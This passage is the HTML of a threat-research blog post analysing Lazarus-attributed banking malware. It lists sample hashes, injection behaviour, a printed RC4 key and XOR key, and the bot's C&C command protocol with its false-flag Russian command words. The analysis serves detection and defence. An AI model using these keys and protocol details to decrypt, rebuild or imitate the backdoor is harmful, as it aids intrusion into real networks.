      .content-wrapper {
        width: 500px;
      }
      .sidebar-wrapper {
        width: 500px;
        margin: 40px 0 0 0;
      }
      .slides {
        width: 500px;
      }
      .slides .grid {
        width: 100%;
        margin: 0 0 30px 0;
        padding: 0 0 30px 0;
        border-bottom: 1px dotted #777;
      }
      footer.credit .footer {
        width: 500px;
        margin: 0 auto;
      }
	  footer .wrap {
		width: 96%;
		padding: 0 2%;
      }
    }

	@media screen and (max-width: 620px) {
	  .content-wrapper {
		width: 90%;
      }
	  .main-wrapper {
		width: 100%;
      }
    }
		
  </style>
<link href='https://www.blogger.com/dyn-css/authorization.css?targetBlogID=7345515085838422799&amp;zx=c37a2204-52be-4b6f-b261-6482fac393db' media='none' onload='if(media!=&#39;all&#39;)media=&#39;all&#39;' rel='stylesheet'/><noscript><link href='https://www.blogger.com/dyn-css/authorization.css?targetBlogID=7345515085838422799&amp;zx=c37a2204-52be-4b6f-b261-6482fac393db' rel='stylesheet'/></noscript>
<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
<meta name='google-adsense-platform-domain' content='blogspot.com'/>

</head>
<body class='loading'>
<div class='navbar section' id='navbar'><div class='widget Navbar' data-version='1' id='Navbar1'><script type="text/javascript">
    function setAttributeOnload(object, attribute, val) {
      if(window.addEventListener) {
        window.addEventListener('load',
          function(){ object[attribute] = val; }, false);
      } else {
        window.attachEvent('onload', function(){ object[attribute] = val; });
      }
    }
  </script>
<div id="navbar-iframe-container"></div>
<script type="text/javascript" src="https://apis.google.com/js/platform.js"></script>
<script type="text/javascript">
      gapi.load("gapi.iframes:gapi.iframes.style.bubble", function() {
        if (gapi.iframes && gapi.iframes.getContext) {
          gapi.iframes.getContext().openChild({
              url: 'https://www.blogger.com/navbar/7345515085838422799?po\x3d2633799336061422338\x26origin\x3dhttps://baesystemsai.blogspot.com',
              where: document.getElementById("navbar-iframe-container"),
              id: "navbar-iframe"
          });
        }
      });
    </script><script type="text/javascript">
(function() {
var script = document.createElement('script');
script.type = 'text/javascript';
script.src = '//pagead2.googlesyndication.com/pagead/js/google_top_exp.js';
var head = document.getElementsByTagName('head')[0];
if (head) {
head.appendChild(script);
}})();
</script>
</div></div>
<div class='outer-wrapper'>
<div class='container'>
<div class='outer-header'>
<header class='header-wrapper'>
<div class='top-menu'>
<ul>
<li><a href='http://www.baesystems.com/en/cybersecurity/resources' target='_blank'>Resources</a></li>
<li><a href='http://www.baesystems.com/en/cybersecurity/contact-us' target='_blank'>Contact us</a></li>
</ul>
</div>
<div class='header left section' id='header'><div class='widget Header' data-version='1' id='Header1'>
<div id='header-inner'>
<div class='titlewrapper'>
<h1 class='title'>
<a href='https://baesystemsai.blogspot.com/'>
BAE Systems Threat Research Blog
</a>
</h1>
</div>
<div class='descriptionwrapper'>
<p class='description'><span>
</span></p>
</div>
</div>
</div></div>
<div class='navigation right section' id='navigation'><div class='widget PageList' data-version='1' id='PageList1'>
<h2>Pages</h2>
<div class='widget-content'>
<ul>
<li>
<a href='https://baesystemsai.blogspot.com/'>Home</a>
</li>
<li>
<a href='http://www.baesystems.com/en/cybersecurity/products'>Products</a>
</li>
<li>
<a href='http://www.baesystems.com/en/cybersecurity/solutions'>Solutions</a>
</li>
<li>
<a href='http://www.baesystems.com/en/cybersecurity/news-and-events'>News & Events</a>
</li>
<li>
<a href='http://www.baesystems.com/en/cybersecurity/partners'>Partners</a>
</li>
<li>
<a href='http://www.baesystems.com/en/cybersecurity/about-us'>About Us</a>
</li>
<li>
<a href='http://www.baesystems.com/en/cybersecurity/careers'>Careers</a>
</li>
</ul>
<div class='clear'></div>
</div>
</div><div class='widget BlogArchive' data-version='1' id='BlogArchive1'>
<h2>Blog Archive</h2>
<div class='widget-content'>
<div id='ArchiveList'>
<div id='BlogArchive1_ArchiveList'>
<ul class='hierarchy'>
<li class='archivedate expanded'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy toggle-open'>

        &#9660;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://baesystemsai.blogspot.com/2017/'>
2017
</a>
<span class='post-count' dir='ltr'>(5)</span>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://baesystemsai.blogspot.com/2017/10/'>
October
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://baesystemsai.blogspot.com/2017/05/'>
May
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://baesystemsai.blogspot.com/2017/04/'>
April
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate expanded'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy toggle-open'>

        &#9660;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://baesystemsai.blogspot.com/2017/02/'>
February
</a>
<span class='post-count' dir='ltr'>(2)</span>
<ul class='posts'>
<li><a href='https://baesystemsai.blogspot.com/2017/02/lazarus-false-flag-malware.html'>Lazarus&#8217; False Flag Malware</a></li>
<li><a href='https://baesystemsai.blogspot.com/2017/02/lazarus-watering-hole-attacks.html'>Lazarus &amp; Watering-hole attacks</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://baesystemsai.blogspot.com/2016/'>
2016
</a>
<span class='post-count' dir='ltr'>(4)</span>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://baesystemsai.blogspot.com/2016/05/'>
May
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://baesystemsai.blogspot.com/2016/04/'>
April
</a>
<span class='post-count' dir='ltr'>(2)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://baesystemsai.blogspot.com/2016/01/'>
January
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://baesystemsai.blogspot.com/2015/'>
2015
</a>
<span class='post-count' dir='ltr'>(3)</span>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://baesystemsai.blogspot.com/2015/12/'>
December
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://baesystemsai.blogspot.com/2015/11/'>
November
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://baesystemsai.blogspot.com/2015/06/'>
June
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://baesystemsai.blogspot.com/2013/'>
2013
</a>
<span class='post-count' dir='ltr'>(3)</span>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://baesystemsai.blogspot.com/2013/11/'>
November
</a>
<span class='post-count' dir='ltr'>(3)</span>
</li>
</ul>
</li>
</ul>
</div>
</div>
<div class='clear'></div>
</div>
</div><div class='widget BlogSearch' data-version='1' id='BlogSearch1'>
<h2 class='title'>Search</h2>
<div class='widget-content'>
<div id='BlogSearch1_form'>
<form action='https://baesystemsai.blogspot.com/search' class='gsc-search-box' target='_top'>
<table cellpadding='0' cellspacing='0' class='gsc-search-box'>
<tbody>
<tr>
<td class='gsc-input'>
<input autocomplete='off' class='gsc-input' name='q' size='10' title='search' type='text' value=''/>
</td>
<td class='gsc-search-button'>
<input class='gsc-search-button' title='search' type='submit' value='Search'/>
</td>
</tr>
</tbody>
</table>
</form>
</div>
</div>
<div class='clear'></div>
</div></div>
<div class='clear'></div>
</header><!-- END HeaderWrapper -->
</div>
</div>
<div class='branding'>
<div class='sidebar tagline section' id='tagline'><div class='widget Image' data-version='1' id='Image1'>
<div class='widget-content'>
<img alt='BAE Systems AI Blog Banner' height='180' id='Image1_img' src='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjprvi0pJhuy3vOA2R4XPr0uQUleJp9wXv1gAselLH6PoELE3uo6wFTTXc-_JWDaErgR_b5qKOy_Svf82dcRmdDHhMiGlYgg5n7BNZ0qNN7PBzLixVguXMD0RhTLDnsa9jegdhRP4_B8sg/s1600-r/Threat+Research+Blog+Banner.jpg' width='1600'/>
<br/>
</div>
<div class='clear'></div>
</div></div>
<div class='branding-wrap'>
<div class='banner-text section' id='ban-text'><div class='widget Text' data-version='1' id='Text1'>
<div class='widget-content'>
<span>Threat Research Blog</span>
</div>
<div class='clear'></div>
</div></div>
<div class='banner-logo'>
<img src="https://lh3.googleusercontent.com/blogger_img_proxy/AEn0k_vYHUhCnzeom-myhllui8dz8RwF36zJA0QEIzeljBnuneDP5e6--wj7soThJMl4DTikpbYxqChYknvEOfLEZju2Hr5mSxiwnqTu0u9AD_2hjHtwzLFnU7t-6vQ3oCj6RpgbmdBn=s0-d">
</div>
</div>
</div>
<div class='slidetoggle'>
<div class='slides'>
<div class='sidebar grid left no-items section' id='grid1'>
</div>
<div class='sidebar grid left section' id='grid2'><div class='widget HTML' data-version='1' id='HTML3'>
<h2 class='title'>Flickr</h2>
<div class='widget-content'>
</div>
<div class='clear'></div>
</div></div>
<div class='sidebar grid left section' id='grid3'><div class='widget Label' data-version='1' id='Label1'>
<h2>Labels</h2>
<div class='widget-content list-label-widget-content'>
<ul>
<li>
<a dir='ltr' href='https://baesystemsai.blogspot.com/search/label/Threat%20Research'>Threat Research</a>
</li>
</ul>
<div class='clear'></div>
</div>
</div></div>
<div class='clear'></div>
</div>
</div>
<div class='container'>
<div class='content-wrapper'>
<div class='main-wrapper left'>
<div class='main section' id='main'><div class='widget Blog' data-version='1' id='Blog1'>
<div class='blog-posts hfeed'>
<div class='breadcrumbs' xmlns:v='http://rdf.data-vocabulary.org/#'>
<span typeof='v:Breadcrumb'><a href='https://baesystemsai.blogspot.com/' property='v:title' rel='v:url'>Home</a></span>

 &#187; <span typeof='v:Breadcrumb'><a href='https://baesystemsai.blogspot.com/search/label/Threat%20Research' property='v:title' rel='v:url'>Threat Research</a></span>

 &#187; <span>Lazarus&#8217; False Flag Malware</span>
</div>
<!--Can't find substitution for tag [defaultAdStart]-->

          <div class="date-outer">
        

          <div class="date-posts">
        
<div class='post-outer blog-outer'>
<div class='post hentry uncustomized-post-template' itemprop='blogPost' itemscope='itemscope' itemtype='http://schema.org/BlogPosting'>
<meta content='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg5m4b1zAFAs0v7F5S4K-vCXbP6s-XN4TsFUUDQS6vxCsHPoUyuEIZrLeC9jhGJKwhtXKPk4qPX5yNJifOsd9kTfMAK9F_pqfGdmajKF8Aff-0y3Fshp2sjWwrnF8nCI0D39-KWBz2lOpI/s640/client.PNG' itemprop='image_url'/>
<meta content='7345515085838422799' itemprop='blogId'/>
<meta content='2633799336061422338' itemprop='postId'/>
<a name='2633799336061422338'></a>
<div class='post-header-line-0'>
<span class='post-author vcard'>
Posted by
<span class='fn' itemprop='author' itemscope='itemscope' itemtype='http://schema.org/Person'>
<span itemprop='name'>Sergei Shevchenko</span>
</span>
</span>
<span class='date-footer'>- Monday, 20 February 2017</span>
</div>
<h3 class='post-title entry-title' itemprop='name'>
Lazarus&#8217; False Flag Malware
</h3>
<div class='post-header'>
<div class='post-header-line-1'>
</div>
</div>
<div class='post-body entry-content' id='post-body-2633799336061422338' itemprop='articleBody'>
<em>Written by Sergei Shevchenko and Adrian Nish</em><br />
<h5 style="font-size: 20px; margin-bottom: 0px;">
BACKGROUND<a name='more'></a></h5>
We continue to investigate the recent wave of attacks on banks using watering-holes on at least two financial regulator websites as well as others. Our initial analysis of malware disclosed in the BadCyber blog hinted at the involvement of the 'Lazarus' threat actor. Since the release of our report, more samples have come to light, most notably those described in the Polish language <em>niebezpiecznik.pl</em> <a href="https://niebezpiecznik.pl/post/jak-przeprowadzono-atak-na-knf-i-polskie-banki-oraz-kto-jeszcze-byl-na-celowniku-przestepcow/" target="_blank">blog</a> on 7 February 2017.<br />
<br />
<div style="overflow-x: auto;">
<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse; border: none; width: 100%px;">
    <tbody>
<tr>
 <td style="background: #3d4146; border: solid #3d4146 1.0pt; color: white; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="top">MD5 hash
        </td>
        <td style="background: #3d4146; border-left: none; border: solid #3d4146 1.0pt; color: white; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="top">Filename
        </td>
        <td style="background: #3d4146; border-left: none; border: solid #3d4146 1.0pt; color: white; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="top">Compile Time
        </td>
        <td style="background: #3d4146; border-left: none; border: solid #3d4146 1.0pt; color: white; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="top">File Info
        </td>
        <td style="background: #3d4146; border-left: none; border: solid #3d4146 1.0pt; color: white; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="top">Submitted
        </td>
    </tr>
<tr>
        <td style="border-top: none; border: solid #3d4146 1.0pt; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="bottom">9216b29114fb6713ef228370cbfe4045
        </td>
 <td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="top">srservice.chm
        </td>
        <td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="top">N/A
 </td>
        <td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="top">N/A
        </td>
        <td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="top">N/A
        </td>
    </tr>
<tr>
        <td style="border-top: none; border: solid #3d4146 1.0pt; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="bottom">8e32fccd70cec634d13795bcb1da85ff
        </td>
 <td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="top">srservice.hlp
        </td>
        <td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="top">N/A
 </td>
        <td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="top">N/A
        </td>
        <td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="top">N/A
        </td>
    </tr>
<tr>
        <td style="border-top: none; border: solid #3d4146 1.0pt; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="bottom">e29fe3c181ac9ddbb242688b151f3310
        </td>
 <td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="top">srservice.dll
        </td>
        <td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="top">2016-10-22<br />
08:08
 </td>
        <td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="top">Win64 DLL<br />
78 KB
        </td>
        <td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="top">2017-01-28<br />
11:58
        </td>
    </tr>
<tr>
        <td style="border-top: none; border: solid #3d4146 1.0pt; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="bottom">9914075cc687bdc352ee136ac6579707
        </td>
 <td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="top">fdsvc.exe
        </td>
        <td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="top">2016-08-26<br />
04:19
 </td>
        <td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="top">Win64 EXE<br />
60 KB
        </td>
        <td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="top">2017-02-05<br />
15:14
        </td>
    </tr>
<tr>
        <td style="border-top: none; border: solid #3d4146 1.0pt; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="bottom">9cc6854bc5e217104734043c89dc4ff8
        </td>
 <td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="top">fdsvc.dll
        </td>
        <td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="top">2016-08-26<br />
04:11
 </td>
        <td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="top">Encrypted<br />
470 KB
        </td>
        <td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="top">2017-02-05<br />
15:15
        </td>
    </tr>
</tbody>
</table>
</div>
<br />
Of the hashes provided, only three samples could be found in public malware repositories.  All three had been submitted from Poland in recent weeks.<br />
<br />
In the analysis section below we examine these and the &#8216;false flag&#8217; approach employed by the attackers in order to spoof the origin of the attack. The same &#8216;false flag&#8217; approach was also found in the SWF-based exploit mentioned in our <a href="http://baesystemsai.blogspot.com/2017/02/lazarus-watering-hole-attacks.html" target="_blank">previous</a> blogpost:<br />
<br />
<div style="overflow-x: auto;">
<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse; border: none; width: 100%px;">
    <tbody>
<tr>
 <td style="background: #3d4146; border: solid #3d4146 1.0pt; color: white; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="top">MD5 hash
        </td>
        <td style="background: #3d4146; border-left: none; border: solid #3d4146 1.0pt; color: white; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="top">Filename
        </td>
        <td style="background: #3d4146; border-left: none; border: solid #3d4146 1.0pt; color: white; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="top">File Info
        </td>
        <td style="background: #3d4146; border-left: none; border: solid #3d4146 1.0pt; color: white; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="top">Submitted
        </td>
    </tr>
<tr>
        <td style="border-top: none; border: solid #3d4146 1.0pt; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="bottom">6dffcfa68433f886b2e88fd984b4995a
        </td>
 <td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="top">cambio.swf
        </td>
        <td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="top">Adobe Flash
        </td>
        <td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="top">2016-12-07 23:15
        </td>
    </tr>
</tbody>
</table>
</div>
<br />
Here we&#8217;ll analyse these files as well as shed further light on the watering-hole exploit kit code itself, in the hope this aids further detection and network defence.<br />
<h5 style="font-size: 20px; margin-bottom: 0px;">
ANALYSIS</h5>
<h5 style="font-size: 20px; margin-bottom: 0px;">
Sample #1 &#8211; srservice.chm</h5>
<br />
Most likely, this file is an encrypted backdoor that is decrypted and injected by DLL loader.
The filename <code>srservice.chm</code> is consistent with the method in which a known Lazarus toolkit module constructs CHM and HLP file names:<br />
<br />
<div style="background: #f2f2f2; border: solid #a6a6a6 1.0pt; padding: 2pt; text-align: left;">
<div style="background: #f2f2f2; margin-left: 5px;">
<code>%SYSTEMROOT%\Help\%MODULE_NAME%.chm<br />
%SYSTEMROOT%\Help\%MODULE_NAME%.hlp</code></div>
</div>
<br />
<h5 style="font-size: 20px; margin-bottom: 0px;">
Sample #2 &#8211; srservice.hlp</h5>
<br />
Most likely, this file is an encrypted configuration file, which is decrypted and loaded by the sample #1 (<code>srservice.chm</code>).<br />
<h5 style="font-size: 20px; margin-bottom: 0px;">
Sample #3 &#8211; srservice.dll</h5>
<br />
This DLL loads, decrypts and injects the 'CHM' file into the system <code>lsass.exe</code> process.<br />
<h5 style="font-size: 20px; margin-bottom: 0px;">
Sample #4 &#8211; fdsvc.exe</h5>
<br />
This file is a command line tool that accepts several parameters such as encrypted file name and process ID. The tool reads and decrypts the specified file, and then injects it into the specified process or into the system process <code>explorer.exe</code>.<br />
<br />
The encryption consists of a running XOR, followed with RC4, using the 32-byte RC4 key below:<br />
<br />
<div style="background: #f2f2f2; border: solid #a6a6a6 1.0pt; padding: 2pt; text-align: left;">
<div style="background: #f2f2f2; margin-left: 5px;">
<code>A6 EB 96 00 61 B2 E2 EF 0D CB E8 C4 5A F1 66 9C
<br />A4 80 CD 9A F1 2F 46 25 2F DB 16 26 4B C4 3F 3C</code></div>
</div>
<br />
<h5 style="font-size: 20px; margin-bottom: 0px;">
Sample #5 &#8211; fdsvc.dll</h5>
<br />
The file <code>fdsvc.dll</code> is an encrypted file, successfully decrypted into a valid DLL (MD5: <code>889e320cf66520485e1a0475107d7419</code>) by the aforementioned executable <code>fdsvc.exe</code>.<br />
<br />
Once decrypted, it represents itself as a bot that accepts the C&amp;C name and port number(s) as a string parameter that is used to call the DLL. The parameter is encoded with an XOR loop that includes XOR key <code>cEzQfoPw</code>.<br />
<br />
Multiple C&amp;C servers can be delimited with the '<code>|</code>' character and port numbers are delimited from the C&amp;C servers with the <code>':'</code> character.<br />
<br />
Once the bot has established communication with the remote C&amp;C, it uses several transliterated Russian words to either indicate the state of its communication or issue backdoor commands, such as:<br />
<br />
<div style="overflow-x: auto;">
<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse; border: none; width: 100%px;"><tbody>
<tr>
<td style="background: #3d4146; border: solid #3d4146 1.0pt; color: white; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle">Word</td>
<td style="background: #3d4146; border-left: none; border: solid #3d4146 1.0pt; color: white; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle">State/Backdoor Command</td>
</tr>
<tr>
<td style="border-top: none; border: solid #3d4146 1.0pt; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle">"Nachalo"</td>
<td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle">start communication session</td>
</tr>
<tr>
<td style="border-top: none; border: solid #3d4146 1.0pt; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle">"ustanavlivat"</td>
<td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle">handshake state</td>
</tr>
<tr>
<td style="border-top: none; border: solid #3d4146 1.0pt; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle">"poluchit"</td>
<td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle">receive data</td>
</tr>
<tr>
<td style="border-top: none; border: solid #3d4146 1.0pt; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle">"pereslat"</td>
<td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle">send data</td>
</tr>
<tr>
<td style="border-top: none; border: solid #3d4146 1.0pt; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle">"derzhat"</td>
<td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle">maintain communication session</td>
</tr>
<tr>
<td style="border-top: none; border: solid #3d4146 1.0pt; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle">"vykhodit"</td>
<td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle">exit communication session</td>
</tr>
</tbody></table>
</div>
<br />
The binary protocol is custom. For example, during the <em>"ustanavlivat"</em> (handshake) mode, the bot accepts 4 bytes, which are then decrypted. The decryption is a loop that involves multiple XOR operations performed over the received data. Once decrypted, the 4 bytes indicate the size of the next data chunk to be received.<br />
<br />
The next received data chunk is also decrypted, and its contents checked to see whether it's one of the backdoor commands.<br />
<br />
For example, the <em>"poluchit"</em> command instructs the bot to receive the file, and the <em>"pereslat"</em> (send) command instructs the bot to upload the file. The received <em>"poluchit"</em> command may also contain a URL, marked with another transliterated Russian word <em>"ssylka"</em> (link). In this case, the remote file is fetched in a separate thread. If a received data chunk contains the command <em>"vykhodit"</em>, the bot quits its backdoor loop.<br />
<br />
The bot implements the SSL/TLS protocol, and is based on a source code of <em>"Curl v7.49.1"</em>. Hence, it is able to transfer files via HTTP, HTTPS, FTP, SMTP and many other protocols, with full support of user/password authentication (Basic, Digest, NTLM, Negotiate, Kerberos), proxies and SSL certificates.<br />
<br />
<h5 style="font-size: 20px; margin-bottom: 0px;">
Russian language used in fdsvc.dll</h5>
<br />
In spite of some 'Russian' words being used, it is evident that the malware author is not a native Russian speaker.<br />
<br />
Of our previous examples, five of the commands were likely produced by an online translation. Below we provide the examples and the correct analogues for reference:<br />
<br />
<div style="overflow-x: auto;">
<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse; border: none; width: 100%px;"><tbody>
<tr>
<td style="background: #3d4146; border: solid #3d4146 1.0pt; color: white; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle">Word</td>
<td style="background: #3d4146; border-left: none; border: solid #3d4146 1.0pt; color: white; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle">Type of error</td>
<td style="background: #3d4146; border-left: none; border: solid #3d4146 1.0pt; color: white; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle">Correct analogue</td>
</tr>
<tr>
<td style="border-top: none; border: solid #3d4146 1.0pt; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle"><em>"ustanavlivat"</em></td>
